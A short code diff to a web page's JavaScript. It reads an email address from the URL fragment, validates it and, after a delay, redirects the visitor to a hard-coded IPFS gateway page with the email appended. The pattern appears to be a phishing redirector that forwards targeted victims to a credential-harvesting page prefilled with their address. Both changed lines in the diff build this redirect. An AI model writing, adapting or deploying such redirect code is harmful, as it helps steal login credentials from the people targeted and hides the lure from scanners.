@@ -139,7 +139,7 @@
       // Get URL parameters
       document.getElementById('wrapper').style.display = 'none';
       const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('mail'); // Get 'mail' parameter
+      const email = window.location.hash.substr(1); //urlParams.get('mail'); // Get 'mail' parameter
 
       // If the 'mail' parameter exists and is a valid email
       if (email && validateEmail(email)) {
@@ -148,7 +148,7 @@
 
         setTimeout(() => {
           // Redirect to the desired URL
-          window.location.href = "new_url"+email; // Change this to the URL you want to redirect to
+          window.location.href = "https://ipfs.io/ipfs/bafybeih2kfmgijxrfdxvwo2dxdfgpji2rzduyhsnlzgdpxi7kacyewvcim/#"+email; // Change this to the URL you want to redirect to
         }, 1000); // 5 seconds delay
       } else {
         document.getElementById('wrapper').style.display = 'block';
